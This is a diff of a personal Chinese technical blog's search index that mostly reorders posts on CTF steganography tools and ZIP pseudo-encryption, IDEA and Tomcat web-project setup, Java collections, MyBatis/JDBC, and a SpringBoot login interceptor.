-<h3 id="3-StegSolve（Windows）"><a href="#3-StegSolve（Windows）" class="headerlink" title="3.StegSolve（Windows）"></a>3.StegSolve（Windows）</h3><p>能够对常见的照片格式进行偏移、LSB提取、帧提取、拉长等</p>
-<h3 id="4-Stegdetect（Windows）"><a href="#4-Stegdetect（Windows）" class="headerlink" title="4.Stegdetect（Windows）"></a>4.Stegdetect（Windows）</h3><p>用于检测JPEG文件中是否包含隐藏内容，并尝试分析是哪个工具嵌入的，使用方式：</p>
-<p><code>stegdetect [-nqV] [-s &lt;float&gt;] [-d &lt;num&gt;] [-t &lt;tests&gt;] [file.jpg]</code></p>
-<table>
-<thead>
-<tr>
-<th>参数信息</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>-q 仅显示可能包含隐藏内容的图像。</td>
-</tr>
-<tr>
-<td>-n 启用检查 JPEG 文件头功能，以降低误报率。如果启用，所有带有批注区域的文件将被视为没有被嵌入信息。如果 JPEG 文件的 JFIF 标识符中的版本号不是1.1，则禁用 OutGuess 检测。</td>
-</tr>
-<tr>
-<td>-s 修改检测算法的敏感度，该值的默认值为1。检测结果的匹配度与检测算法的敏感度成正比，算法敏感度的值越大，检测出的可疑文件包含敏感信息的可能性越大。</td>
-</tr>
-<tr>
-<td>-d 打印带行号的调试信息。</td>
-</tr>
-<tr>
-<td>-t 设置要检测哪些隐写工具（默认检测 jopi），可设置的选项如下： j 检测图像中的信息是否是用 jsteg 嵌入的。 o  检测图像中的信息是否是用 outguess 嵌入的。 p 检测图像中的信息是否是用 jphide 嵌入的。 i 检测图像中的信息是否是用  invisible secrets 嵌入的。</td>
-</tr>
-</tbody></table>
-<h3 id="5-Outguess（Windows）"><a href="#5-Outguess（Windows）" class="headerlink" title="5.Outguess（Windows）"></a>5.Outguess（Windows）</h3><p>提取JPEG文件中使用Outguess算法的加入的隐藏信息</p>
-<h3 id="6-MP3Stego（Windows）"><a href="#6-MP3Stego（Windows）" class="headerlink" title="6.MP3Stego（Windows）"></a>6.MP3Stego（Windows）</h3><p>对于MP3音频文件的隐写和提取，如一个名为“123.mp3”的文件</p>
-<table>
-<thead>
-<tr>
-<th>命令</th>
-<th>功能</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>decode -X -P 123.mp3</td>
-<td>提取123mp3信息到123.txt中</td>
-</tr>
-<tr>
-<td>encode -E 123.txt -P pass 123.mp3</td>
-<td>把123.txt文件写入123.mp3中</td>
-</tr>
-</tbody></table>
-<p><a href="https://www.petitcolas.net/steganography/mp3stego/">下载链接</a></p>
-<h3 id="7-ZipCenOp伪加密（Windows）"><a href="#7-ZipCenOp伪加密（Windows）" class="headerlink" title="7.ZipCenOp伪加密（Windows）"></a>7.ZipCenOp伪加密（Windows）</h3><table>
-<thead>
-<tr>
-<th>命令</th>
-<th>功能</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>java -jar ZipCenOp.jar e xxx.zip</td>
-<td>加密</td>
-</tr>
-<tr>
-<td>java -jar ZipCenOp.jar r xxx.zip</td>
-<td>解密</td>
-</tr>
-</tbody></table>
-<p><img src="https://s3.ax1x.com/2020/11/29/D6LBon.jpg" alt="D6LBon.jpg"></p>
-<p><strong>a.压缩源文件数据区：</strong></p>
-<p>50 4B 03 04：这是头文件标记（0x04034b50）<br> 14 00：解压文件所需 pkware 版本<br> 09 00：全局方式位标记（有无加密）<br> 08 00：压缩方式<br> 50 A3：最后修改文件时间<br> A5 4A：最后修改文件日期<br> 21 38 76 64：CRC-32校验（1480B516）<br> 19 00 00 00：压缩后尺寸（25）<br> 17 00 00 00：未压缩尺寸（23）<br> 08 00：文件名长度<br> 00 00：扩展记录长度</p>
-<p>666C61672E7478744BCB494CAF764CC935F4D3753272D7CD0ED50D8EF20CA80500</p>
-<p><strong>b.压缩源文件目录区:</strong></p>
-<p>50 4B 01 02：目录中文件文件头标记(0x02014b50)<br> 1F 00：压缩使用的 pkware 版本<br> 14 00：解压文件所需 pkware 版本<br> 09 00：全局方式位标记（有无加密，这个更改这里进行伪加密，改为09 00打开就会提示有密码了）<br> 08 00：压缩方式<br> 50 A3：最后修改文件时间<br> A5 4A：最后修改文件日期<br> 21 38 76 65：CRC-32校验（1480B516）<br> 19 00 00 00：压缩后尺寸（25）<br> 17 00 00 00：未压缩尺寸（23）<br> 08 00：文件名长度<br> 24 00：扩展字段长度<br> 00 00：文件注释长度<br> 00 00：磁盘开始号<br> 00 00：内部文件属性<br> 20 00 00 00：外部文件属性<br> 00 00 00 00：局部头部偏移量<br> 666C61672E7478740A00200000000000010018000FF504D59AC5D201461FCB8A9AC5D201461FCB8A9AC5D201</p>
-<p><strong>c.压缩源文件目录结束标志:</strong></p>
-<p>50 4B 05 06：目录结束标记<br> 00 00：当前磁盘编号<br> 00 00：目录区开始磁盘编号<br> 01 00：本磁盘上纪录总数<br> 01 00：目录区中纪录总数<br> 5A 00 00 00：目录区尺寸大小<br> 3F 00 00 00：目录区对第一张磁盘的偏移量<br> 00 00 00：ZIP 文件注释长度</p>
-<h4 id="识别真假加密"><a href="#识别真假加密" class="headerlink" title="识别真假加密"></a>识别真假加密</h4><p><strong>无加密</strong><br> 压缩源文件数据区的全局加密应当为00 00<br> 且压缩源文件目录区的全局方式位标记应当为00 00</p>
-<p><strong>假加密</strong><br> 压缩源文件数据区的全局加密应当为00 00<br> 且压缩源文件目录区的全局方式位标记应当为09 00</p>
-<p><strong>真加密</strong><br> 压缩源文件数据区的全局加密应当为09 00<br> 且压缩源文件目录区的全局方式位标记应当为09 00</p>
-<p>把09 00 改成00 00 之后，保存，重新打开，即可看到flag</p>
-<h3 id="8-Steghide"><a href="#8-Steghide" class="headerlink" title="8.Steghide"></a>8.Steghide</h3><h3 id="9-cloacked-pixel"><a href="#9-cloacked-pixel" class="headerlink" title="9.cloacked-pixel"></a>9.cloacked-pixel</h3><p>用于lsb解密，但是没有密码</p>
-<p>python2 lsb.py extract flag.png 1.txt password</p>
-]]></content>
-      <categories>
-        <category>第一届DMCTF夺旗赛</category>
-      </categories>
   </entry>
   <entry>
     <title>Hadoop集群环境搭建1</title>
@@ -794,57 +794,6 @@
       </tags>
   </entry>
   <entry>
-    <title>IDEA新建Web项目</title>
-    <url>/post/f1926f41.html</url>
-    <content><![CDATA[<p>　　这个是创建普通javaweb项目的步骤，建议使用maven创建，导包不用这么麻烦<a href="/post/4bd31b3a.html" title="Maven环境变量配置">Maven环境变量配置</a><a id="more"></a></p>
-<h1 id="1-创建web-project"><a href="#1-创建web-project" class="headerlink" title="1.创建web project"></a>1.创建web project</h1><p>File-&gt;new Project</p>
-<img src="https://s3.ax1x.com/2020/12/13/reKhjJ.md.jpg" alt="reKhjJ.md.jpg" style="zoom:50%;" />
-
-<img src="https://s3.ax1x.com/2020/12/13/reKW3F.jpg" alt="reKW3F.jpg" style="zoom:50%;" />
-
-<p>之后，在web/WEB-INF文件夹下面创建两个文件夹：classes和lib</p>
-<p>lib存放第三方jar包，classes存放编译后输出的class文件</p>
-<p>创建好的目录如下</p>
-<p><img src="https://s3.ax1x.com/2020/12/13/reKghT.jpg" alt="reKghT.jpg"></p>
-<h1 id="2-接下来需要配置文件夹路径"><a href="#2-接下来需要配置文件夹路径" class="headerlink" title="2.接下来需要配置文件夹路径"></a>2.接下来需要配置文件夹路径</h1><p>File-&gt;Project Structure-&gt;选择Module：</p>
-<p>在Paths界面修改，把路径修改为刚刚创建的classes文件夹，最后点击Apply</p>
-<img src="https://s3.ax1x.com/2020/12/13/reKfc4.jpg" alt="reKfc4.jpg" style="zoom:50%;" />
-
-<p>再点击Dependencies-&gt;将Module SDK选择为自己的JDK-&gt;点击右边+号-&gt;选择Jars or Directories</p>
-<img src="https://s3.ax1x.com/2020/12/13/reK5u9.jpg" alt="reK5u9.jpg" style="zoom:50%;" />
-
-<p>——————&gt;</p>
-<img src="https://s3.ax1x.com/2020/12/13/reKIBR.jpg" alt="reKIBR.jpg" style="zoom:50%;" />
-
-<p>——————&gt;</p>
-<p><img src="https://s3.ax1x.com/2020/12/13/reKoH1.jpg" alt="reKoH1.jpg"></p>
-<p>然后就OK了</p>
-<h1 id="3-配置Tomcat容器"><a href="#3-配置Tomcat容器" class="headerlink" title="3.配置Tomcat容器"></a>3.配置Tomcat容器</h1><p>(1) 打开菜单Run-&gt;选择Edit Configuration，也可以点击上方的Edit Configuration</p>
-<img src="https://s3.ax1x.com/2020/12/13/reK7Ax.jpg" alt="reK7Ax.jpg" style="zoom:50%;" />
-
-<p>(2) 点击+号-&gt;Tomcat Server-&gt;Local</p>
-<img src="https://s3.ax1x.com/2020/12/13/reKHN6.jpg" alt="reKHN6.jpg" style="zoom:50%;" />
-
-<p>(3) 在”Name“处创建Tomcat名字，点击”Application server“后面的”Configure“，选择本地安装的Tomcat路径-&gt;OK</p>
-<img src="https://s3.ax1x.com/2020/12/13/reKb4K.jpg" alt="reKb4K.jpg" style="zoom:50%;" />
-
-<p>(4) 至此，Tomcat部署完成</p>
-<p>下一步在Tomcat中部署并运行项目</p>
-<p>Run -&gt; Edit Configurations，进入”Run/Debug Configurations”窗口 -&gt; 选择刚刚建立的Tomcat容器 -&gt; 选择Deployment -&gt; 点击右边的“+”号 -&gt; 选择Artifact–&gt;选择web项目–&gt;Application contex填一个名字–&gt;ok.</p>
-<img src="https://s3.ax1x.com/2020/12/13/reKL9O.jpg" alt="reKL9O.jpg" style="zoom:50%;" />
-
-<p>(5) 编辑Index.jsp文件</p>
-<img src="https://s3.ax1x.com/2020/12/13/reKXge.jpg" alt="reKXge.jpg" style="zoom:50%;" />
-
-<p>(6) 访问Tomcat项目</p>
-<img src="https://s3.ax1x.com/2020/12/13/reKO3D.jpg" alt="reKO3D.jpg" style="zoom:50%;" />
-
-<h1 id="4-Web项目结构"><a href="#4-Web项目结构" class="headerlink" title="4.Web项目结构"></a>4.Web项目结构</h1>]]></content>
-      <tags>
-        <tag>创建项目</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>JDBC使用</title>
     <url>/post/b6296e7c.html</url>
     <content><![CDATA[<p>　　全称为：Java Data Base Connectivity（java数据库连接），可以为多种数据库提供填统一的访问。JDBC是sun开打的一套数据库访问编程接口。<a id="more"></a></p>
@@ -926,6 +875,57 @@
       </tags>
   </entry>
   <entry>
+    <title>IDEA新建Web项目</title>
+    <url>/post/f1926f41.html</url>
+    <content><![CDATA[<p>　　这个是创建普通javaweb项目的步骤，建议使用maven创建，导包不用这么麻烦<a href="/post/4bd31b3a.html" title="Maven环境变量配置">Maven环境变量配置</a><a id="more"></a></p>
+<h1 id="1-创建web-project"><a href="#1-创建web-project" class="headerlink" title="1.创建web project"></a>1.创建web project</h1><p>File-&gt;new Project</p>
+<img src="https://s3.ax1x.com/2020/12/13/reKhjJ.md.jpg" alt="reKhjJ.md.jpg" style="zoom:50%;" />
+
+<img src="https://s3.ax1x.com/2020/12/13/reKW3F.jpg" alt="reKW3F.jpg" style="zoom:50%;" />
+
+<p>之后，在web/WEB-INF文件夹下面创建两个文件夹：classes和lib</p>
+<p>lib存放第三方jar包，classes存放编译后输出的class文件</p>
+<p>创建好的目录如下</p>
+<p><img src="https://s3.ax1x.com/2020/12/13/reKghT.jpg" alt="reKghT.jpg"></p>
+<h1 id="2-接下来需要配置文件夹路径"><a href="#2-接下来需要配置文件夹路径" class="headerlink" title="2.接下来需要配置文件夹路径"></a>2.接下来需要配置文件夹路径</h1><p>File-&gt;Project Structure-&gt;选择Module：</p>
+<p>在Paths界面修改，把路径修改为刚刚创建的classes文件夹，最后点击Apply</p>
+<img src="https://s3.ax1x.com/2020/12/13/reKfc4.jpg" alt="reKfc4.jpg" style="zoom:50%;" />
+
+<p>再点击Dependencies-&gt;将Module SDK选择为自己的JDK-&gt;点击右边+号-&gt;选择Jars or Directories</p>
+<img src="https://s3.ax1x.com/2020/12/13/reK5u9.jpg" alt="reK5u9.jpg" style="zoom:50%;" />
+
+<p>——————&gt;</p>
+<img src="https://s3.ax1x.com/2020/12/13/reKIBR.jpg" alt="reKIBR.jpg" style="zoom:50%;" />
+
+<p>——————&gt;</p>
+<p><img src="https://s3.ax1x.com/2020/12/13/reKoH1.jpg" alt="reKoH1.jpg"></p>
+<p>然后就OK了</p>
+<h1 id="3-配置Tomcat容器"><a href="#3-配置Tomcat容器" class="headerlink" title="3.配置Tomcat容器"></a>3.配置Tomcat容器</h1><p>(1) 打开菜单Run-&gt;选择Edit Configuration，也可以点击上方的Edit Configuration</p>
+<img src="https://s3.ax1x.com/2020/12/13/reK7Ax.jpg" alt="reK7Ax.jpg" style="zoom:50%;" />
+
+<p>(2) 点击+号-&gt;Tomcat Server-&gt;Local</p>
+<img src="https://s3.ax1x.com/2020/12/13/reKHN6.jpg" alt="reKHN6.jpg" style="zoom:50%;" />
+
+<p>(3) 在”Name“处创建Tomcat名字，点击”Application server“后面的”Configure“，选择本地安装的Tomcat路径-&gt;OK</p>
+<img src="https://s3.ax1x.com/2020/12/13/reKb4K.jpg" alt="reKb4K.jpg" style="zoom:50%;" />
+
+<p>(4) 至此，Tomcat部署完成</p>
+<p>下一步在Tomcat中部署并运行项目</p>
+<p>Run -&gt; Edit Configurations，进入”Run/Debug Configurations”窗口 -&gt; 选择刚刚建立的Tomcat容器 -&gt; 选择Deployment -&gt; 点击右边的“+”号 -&gt; 选择Artifact–&gt;选择web项目–&gt;Application contex填一个名字–&gt;ok.</p>
+<img src="https://s3.ax1x.com/2020/12/13/reKL9O.jpg" alt="reKL9O.jpg" style="zoom:50%;" />
+
+<p>(5) 编辑Index.jsp文件</p>
+<img src="https://s3.ax1x.com/2020/12/13/reKXge.jpg" alt="reKXge.jpg" style="zoom:50%;" />
+
+<p>(6) 访问Tomcat项目</p>
+<img src="https://s3.ax1x.com/2020/12/13/reKO3D.jpg" alt="reKO3D.jpg" style="zoom:50%;" />
+
+<h1 id="4-Web项目结构"><a href="#4-Web项目结构" class="headerlink" title="4.Web项目结构"></a>4.Web项目结构</h1>]]></content>
+      <tags>
+        <tag>创建项目</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>JPA框架学习</title>
     <url>/post/9af0416b.html</url>
     <content><![CDATA[<h1 id="1-orm思想"><a href="#1-orm思想" class="headerlink" title="1 orm思想"></a>1 orm思想</h1><p>　　就是相当于操作实体类就是操作数据库表，需要先建立两个映射关系（实体类和表、实体类中的属性和表中字段），实现了orm思想的框架：mybatis、hibernate<a id="more"></a></p>
@@ -982,6 +982,20 @@
 ]]></content>
   </entry>
   <entry>
+    <title>Java集合继承结构</title>
+    <url>/post/cb9bdb06.html</url>
+    <content><![CDATA[<p>　　集合这部分只是很杂乱，这个是搜集的一些资料，很清楚的梳理了集合知识和各个集合类型的特点<a id="more"></a></p>
+<p><img src="https://s3.ax1x.com/2020/12/13/reBQmt.png" alt="reBQmt.png"></p>
+<p><img src="https://s3.ax1x.com/2020/12/13/reBKOI.png" alt="reBKOI.png"></p>
+]]></content>
+      <categories>
+        <category>Java</category>
+      </categories>
+      <tags>
+        <tag>Java</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>JavaScript学习</title>
     <url>/post/d3a7443d.html</url>
     <content><![CDATA[<p>　　在学习小程序期间，没有了解JavaScript，回来补充<a id="more"></a></p>
@@ -1005,20 +1019,6 @@
       </categories>
       <tags>
         <tag>JavaScript</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Java集合继承结构</title>
-    <url>/post/cb9bdb06.html</url>
-    <content><![CDATA[<p>　　集合这部分只是很杂乱，这个是搜集的一些资料，很清楚的梳理了集合知识和各个集合类型的特点<a id="more"></a></p>
-<p><img src="https://s3.ax1x.com/2020/12/13/reBQmt.png" alt="reBQmt.png"></p>
-<p><img src="https://s3.ax1x.com/2020/12/13/reBKOI.png" alt="reBKOI.png"></p>
-]]></content>
-      <categories>
-        <category>Java</category>
-      </categories>
-      <tags>
-        <tag>Java</tag>
       </tags>
   </entry>
   <entry>
@@ -1117,6 +1117,48 @@
       </tags>
   </entry>
   <entry>
+    <title>MyBatis框架</title>
+    <url>/post/669b9acc.html</url>
+    <content><![CDATA[<h1 id="第一章"><a href="#第一章" class="headerlink" title="第一章"></a>第一章</h1><h2 id="1-1-三层架构"><a href="#1-1-三层架构" class="headerlink" title="1.1 三层架构"></a>1.1 三层架构</h2><table>
+<thead>
+<tr>
+<th>架构层</th>
+<th align="left">作用</th>
+<th>对应的包</th>
+<th>对应的处理框架</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>界面层</td>
+<td align="left">和用户打交道的，接受用户的请求参数，显示出理结果（jsp，html，servlet）</td>
+<td>controller包（servlet）</td>
+<td>springmvc</td>
+</tr>
+<tr>
+<td>业务逻辑层</td>
+<td align="left">接受了界面层传递的数据，计算逻辑，调用数据库，获取数据</td>
+<td>service包（XXXService类）</td>
+<td>spring</td>
+</tr>
+<tr>
+<td>数据访问层</td>
+<td align="left">访问数据库，执行对数据的查询，修改，删除等的等等</td>
+<td>dao包（XXXDao）</td>
+<td>mybatis</td>
+</tr>
+</tbody></table>
+<a id="more"></a>三层中类的交互：用户使用界面层-->业务逻辑层-->数据访问层（持久层）-->数据库（mysql）
+
+<h2 id="1-2-JDBC编程"><a href="#1-2-JDBC编程" class="headerlink" title="1.2 JDBC编程"></a>1.2 JDBC编程</h2><h3 id="1-2-1-JDBC编程的回顾"><a href="#1-2-1-JDBC编程的回顾" class="headerlink" title="1.2.1 JDBC编程的回顾"></a>1.2.1 JDBC编程的回顾</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">fidStudent</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Connection conn = <span class="keyword">null</span>;</span><br><span class="line">    Statement stmt = <span class="keyword">null</span>;</span><br><span class="line">    ResultSet rs = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="comment">//注册mysql驱动</span></span><br><span class="line">        Class.forName(<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>);</span><br><span class="line">        <span class="comment">//连接数据库的基本信息url，username，password</span></span><br><span class="line">        String url = <span class="string">&quot;jdbc:mysql://localhost:3306/springdb&quot;</span>;</span><br><span class="line">        String username = <span class="string">&quot;root&quot;</span>;</span><br><span class="line">        String password = <span class="string">&quot;root&quot;</span>;</span><br><span class="line">        <span class="comment">//创建连接对象</span></span><br><span class="line">        conn = DriverManager.getConnection(url,username,password);</span><br><span class="line">        <span class="comment">//保存查询结果</span></span><br><span class="line">        List&lt;Student&gt; stuList = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        <span class="comment">//创建Statement，用来执行sql语句</span></span><br><span class="line">        stmt = conn.createStatement();</span><br><span class="line">        <span class="comment">//执行查询，创建记录集</span></span><br><span class="line">        rs = stmt.executeQuery(<span class="string">&quot;select * from student&quot;</span>);</span><br><span class="line">        <span class="keyword">while</span>(rs.next())&#123;</span><br><span class="line">            Student stu = <span class="keyword">new</span> Student();</span><br><span class="line">            stu.setId(rs.getInt(<span class="string">&quot;id&quot;</span>));</span><br><span class="line">            stu.setName(rs.getString(<span class="string">&quot;name&quot;</span>));</span><br><span class="line">            <span class="comment">//从数据库取出数据转为Student对象，封装到List集合</span></span><br><span class="line">            stuList.add(stu);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;<span class="keyword">finally</span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="comment">//关闭资源</span></span><br><span class="line">            <span class="keyword">if</span>(rs != <span class="keyword">null</span>)&#123;</span><br><span class="line">                rs.close();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(stmt != <span class="keyword">null</span>)&#123;</span><br><span class="line">                stmt.close();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(conn != <span class="keyword">null</span>)&#123;</span><br><span class="line">                conn.close();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="1-2-2-使用JDBC的缺陷"><a href="#1-2-2-使用JDBC的缺陷" class="headerlink" title="1.2.2 使用JDBC的缺陷"></a>1.2.2 使用JDBC的缺陷</h3><p>1.代码比较多，开发效率低</p>
+<p>2.需要关注Connection，Statement，ResultSet对象的创建和销毁</p>
+<p>3.对ResultSet查询的结果，需要自己封装为List</p>
+<p>4.代码重复高</p>
+<p>5.业务代码和数据库操作混在一起</p>
+]]></content>
+  </entry>
+  <entry>
     <title>MongoDB优化</title>
     <url>/post/6276869c.html</url>
     <content><![CDATA[<p>　　MongoDB 是高性能数据，但是在使用的过程中，大家偶尔还会碰到一些性能问题。MongoDB和其它关系型数据库相比，例如 SQL Server 、MySQL 、Oracle 相比来说，相对较新，很多人对其不是很熟悉，所以很多开发、DBA往往是注重功能的实现，而忽视了性能的要求。其实，MongoDB和 SQL Server 、MySQL 、Oracle 一样，一个 数据库对象的设计调整、索引的创建、语句的优化，都会对性能产生巨大的影响。<a id="more"></a></p>
@@ -1168,77 +1210,6 @@
       </tags>
   </entry>
   <entry>
-    <title>MyBatis框架</title>
-    <url>/post/669b9acc.html</url>
-    <content><![CDATA[<h1 id="第一章"><a href="#第一章" class="headerlink" title="第一章"></a>第一章</h1><h2 id="1-1-三层架构"><a href="#1-1-三层架构" class="headerlink" title="1.1 三层架构"></a>1.1 三层架构</h2><table>
-<thead>
-<tr>
-<th>架构层</th>
-<th align="left">作用</th>
-<th>对应的包</th>
-<th>对应的处理框架</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>界面层</td>
-<td align="left">和用户打交道的，接受用户的请求参数，显示出理结果（jsp，html，servlet）</td>
-<td>controller包（servlet）</td>
-<td>springmvc</td>
-</tr>
-<tr>
-<td>业务逻辑层</td>
-<td align="left">接受了界面层传递的数据，计算逻辑，调用数据库，获取数据</td>
-<td>service包（XXXService类）</td>
-<td>spring</td>
-</tr>
-<tr>
-<td>数据访问层</td>
-<td align="left">访问数据库，执行对数据的查询，修改，删除等的等等</td>
-<td>dao包（XXXDao）</td>
-<td>mybatis</td>
-</tr>
-</tbody></table>
-<a id="more"></a>三层中类的交互：用户使用界面层-->业务逻辑层-->数据访问层（持久层）-->数据库（mysql）
-
-<h2 id="1-2-JDBC编程"><a href="#1-2-JDBC编程" class="headerlink" title="1.2 JDBC编程"></a>1.2 JDBC编程</h2><h3 id="1-2-1-JDBC编程的回顾"><a href="#1-2-1-JDBC编程的回顾" class="headerlink" title="1.2.1 JDBC编程的回顾"></a>1.2.1 JDBC编程的回顾</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">fidStudent</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Connection conn = <span class="keyword">null</span>;</span><br><span class="line">    Statement stmt = <span class="keyword">null</span>;</span><br><span class="line">    ResultSet rs = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="comment">//注册mysql驱动</span></span><br><span class="line">        Class.forName(<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>);</span><br><span class="line">        <span class="comment">//连接数据库的基本信息url，username，password</span></span><br><span class="line">        String url = <span class="string">&quot;jdbc:mysql://localhost:3306/springdb&quot;</span>;</span><br><span class="line">        String username = <span class="string">&quot;root&quot;</span>;</span><br><span class="line">        String password = <span class="string">&quot;root&quot;</span>;</span><br><span class="line">        <span class="comment">//创建连接对象</span></span><br><span class="line">        conn = DriverManager.getConnection(url,username,password);</span><br><span class="line">        <span class="comment">//保存查询结果</span></span><br><span class="line">        List&lt;Student&gt; stuList = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        <span class="comment">//创建Statement，用来执行sql语句</span></span><br><span class="line">        stmt = conn.createStatement();</span><br><span class="line">        <span class="comment">//执行查询，创建记录集</span></span><br><span class="line">        rs = stmt.executeQuery(<span class="string">&quot;select * from student&quot;</span>);</span><br><span class="line">        <span class="keyword">while</span>(rs.next())&#123;</span><br><span class="line">            Student stu = <span class="keyword">new</span> Student();</span><br><span class="line">            stu.setId(rs.getInt(<span class="string">&quot;id&quot;</span>));</span><br><span class="line">            stu.setName(rs.getString(<span class="string">&quot;name&quot;</span>));</span><br><span class="line">            <span class="comment">//从数据库取出数据转为Student对象，封装到List集合</span></span><br><span class="line">            stuList.add(stu);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;<span class="keyword">finally</span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="comment">//关闭资源</span></span><br><span class="line">            <span class="keyword">if</span>(rs != <span class="keyword">null</span>)&#123;</span><br><span class="line">                rs.close();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(stmt != <span class="keyword">null</span>)&#123;</span><br><span class="line">                stmt.close();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(conn != <span class="keyword">null</span>)&#123;</span><br><span class="line">                conn.close();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="1-2-2-使用JDBC的缺陷"><a href="#1-2-2-使用JDBC的缺陷" class="headerlink" title="1.2.2 使用JDBC的缺陷"></a>1.2.2 使用JDBC的缺陷</h3><p>1.代码比较多，开发效率低</p>
-<p>2.需要关注Connection，Statement，ResultSet对象的创建和销毁</p>
-<p>3.对ResultSet查询的结果，需要自己封装为List</p>
-<p>4.代码重复高</p>
-<p>5.业务代码和数据库操作混在一起</p>
-]]></content>
-  </entry>
-  <entry>
-    <title>SpringBoot-拦截器</title>
-    <url>/post/e3a97206.html</url>
-    <content><![CDATA[<p>　　SpringBoot学习，主要内容是拦截器，可以实现网站的登录功能<a id="more"></a></p>
-<h1 id="1-实现登录拦截"><a href="#1-实现登录拦截" class="headerlink" title="1.实现登录拦截"></a>1.实现登录拦截</h1><p>　　首先需要编写相应模块的类实现HandlerInterceptor，然后再拦截配置类里面编辑要拦截胡页面。</p>
-<h2 id="1-1-编写类实现HandlerInterceptor类"><a href="#1-1-编写类实现HandlerInterceptor类" class="headerlink" title="1.1 编写类实现HandlerInterceptor类"></a>1.1 编写类实现HandlerInterceptor类</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserInterceptor</span> <span class="keyword">implements</span> <span class="title">HandlerInterceptor</span></span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">preHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//编写业务拦截的规则</span></span><br><span class="line">        <span class="comment">//从session中获取用户的信息</span></span><br><span class="line">        User user = (User) request.getSession().getAttribute(<span class="string">&quot;user&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//判断用户是否登录</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">null</span> == user) &#123;</span><br><span class="line">            <span class="comment">//未登录</span></span><br><span class="line">            response.sendRedirect(request.getContextPath() + <span class="string">&quot;/nologin&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">postHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">afterCompletion</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>　　实现HanderInterceptor，重写preHandle、postHandle、afterCompletion三个方法，先获取session的用户信息，然后判断是否登录。</p>
-<h2 id="1-2-声明拦截配置类"><a href="#1-2-声明拦截配置类" class="headerlink" title="1.2 声明拦截配置类"></a>1.2 声明拦截配置类</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="comment">//定义此类为配置文件</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">InterceptorConfig</span> <span class="keyword">implements</span> <span class="title">WebMvcConfigurer</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addInterceptors</span><span class="params">(InterceptorRegistry registry)</span> 